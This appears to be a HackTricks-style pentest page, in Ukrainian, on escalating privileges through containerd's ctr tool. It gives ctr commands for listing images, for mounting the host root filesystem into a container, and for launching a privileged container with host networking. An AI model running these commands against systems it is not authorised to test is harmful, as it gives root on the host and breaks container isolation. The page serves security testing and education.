# Підвищення привілеїв у Containerd (ctr)

## Основна інформація

Перейдіть за наведеним посиланням, щоб дізнатися, **де `containerd` і `ctr` розташовані в стеку контейнерів**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Якщо ви виявите, що хост містить команду `ctr`, native CLI, що входить до складу containerd:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Можна отримати список образів, відомих containerd:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Потім **запустіть один із цих образів із рекурсивно змонтованим через bind кореневим каталогом хоста в кореневий каталог контейнера**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Запустіть container у privileged mode і перевірте можливість escape.\
Ви можете запустити privileged container, використовуючи host networking:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` надає процесу ефективні Linux capabilities виклику та усуває кілька засобів ізоляції, але escape залишається залежним від середовища; використовуйте техніки, згадані на наведеній нижче сторінці, щоб перевірити це:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Початок роботи з containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Реалізація команди ctr image](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Реалізація команди ctr run](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Документація Linux kernel щодо shared-subtree](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [Пакет containerd OCI: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Прапорці команди containerd `ctr`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
